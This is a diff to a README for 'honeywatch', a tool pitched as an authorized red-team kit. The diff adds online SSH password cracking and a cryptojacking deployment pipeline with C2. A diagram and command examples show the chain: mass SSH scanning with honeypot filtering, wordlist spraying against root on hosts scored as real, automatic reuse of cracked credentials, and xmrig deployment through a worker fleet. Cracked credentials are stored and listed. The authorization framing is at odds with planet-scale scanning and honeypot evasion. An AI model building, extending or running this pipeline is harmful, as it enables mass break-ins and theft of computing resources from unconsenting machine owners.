@@ -9,7 +9,7 @@ authorized red-team payload-deployment toolkit. Everything below describes the
 
 ---
 
-# honeywatch — planet-scale SSH honeypot scanner with AI confidence scoring
+# honeywatch — planet-scale SSH honeypot scanner with AI confidence scoring, online SSH cracking, and a cryptojacking deployment + C2 pipeline
 
 honeywatch scans large address spaces for open SSH (port 22) services, builds a
 deep protocol fingerprint of every one, scores it with **deterministic heuristic
@@ -65,6 +65,27 @@ host-key probing) and `pytest` (tests). The scanners themselves (`masscan`,
       ┌──────────────────────────────────────┐
       │   Score → SQLite + reports           │
       │   (JSON / CSV / Markdown)            │
+      └─────────────────┬────────────────────┘
+                        │  label=real/likely_real hosts
+                        ▼
+      ┌──────────────────────────────────────┐
+      │   crack: SSH password guessing        │  (paramiko)
+      │   wordlist + mutations · per-host     │
+      │   concurrency · stops on first hit    │
+      └─────────────────┬────────────────────┘
+                        │  recovered creds → credentials table
+                        ▼
+      ┌──────────────────────────────────────┐
+      │   deploy: payload manifests          │
+      │   (auto-fills ssh_user/ssh_pass from  │
+      │    the cracked credential store)     │
+      └─────────────────┬────────────────────┘
+                        │
+                        ▼
+      ┌──────────────────────────────────────┐
+      │   C2 controller + worker fleet       │
+      │   ssh exec (key or sshpass password)  │
+      │   → fetch/build/run payload on target │
       └──────────────────────────────────────┘
 ```
 
@@ -457,6 +478,32 @@ honeywatch deploy xmrig \
 
 Use `--controller-url http://controller:8443` to enqueue via the C2 API
 instead of writing directly to the SQLite store.
+
+### SSH password cracking
+
+For initial access on hosts whose password policy you're authorized to test,
+honeywatch ships an online SSH credential-guesser. It reuses the same optional
+`paramiko` transport as the full fingerprint probe (no new hard dependency),
+persists recovered credentials to a `credentials` table so they survive across
+runs, and auto-feeds `deploy` — so the loop closes with no extra flags.
+
+```bash
+# Spray a wordlist + mutations (case, year, symbol suffixes) at one box
+honeywatch crack 10.0.0.5 --wordlist rockyou.txt --user root --skip-vpn-check
+
+# Crack every host the scanner labelled real, then deploy onto them — creds
+# are picked up automatically from the store
+honeywatch crack --target-label real --min-confidence 0.8 --skip-vpn-check
+honeywatch deploy xmrig --target-label real --exec-mode ssh --skip-vpn-check
+
+# List what you've recovered
+honeywatch creds --json
+```
+
+The cracker uses one fresh transport per attempt (rate-limit-friendly), bounds
+concurrency per host (default 8) and per fleet (default 32), stops a host on
+the first hit by default, and never raises — every outcome lands in a
+`CrackResult`. See `honeywatch crack --help` and [docs/crack.md](docs/crack.md).
 
 ### C2 controller / dashboard
 
